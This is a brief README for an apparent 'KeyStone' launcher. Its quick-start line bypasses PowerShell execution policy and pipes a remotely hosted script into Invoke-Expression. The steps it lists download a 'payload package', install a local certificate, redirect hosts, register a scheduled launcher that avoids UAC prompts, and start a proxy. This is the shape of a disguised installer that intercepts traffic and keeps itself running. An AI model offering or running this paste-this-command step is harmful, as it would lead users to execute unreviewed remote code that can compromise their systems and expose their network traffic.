# Testing / KeyStone

Remote one-line launcher and environment bootstrapper.

## Quick Start (Run from PowerShell or CMD)

```powershell
powershell -ExecutionPolicy Bypass -Command "iwr -useb 'https://raw.githubusercontent.com/ershivshankar/Testing/main/boot.ps1' | iex"
```

## What it does
1. Downloads the pre-built payload package to `%LOCALAPPDATA%\ACEx_Launcher`.
2. Automatically configures local certificate and host redirection.
3. Registers the zero-UAC scheduled launcher.
4. Starts the proxy and launches the application.
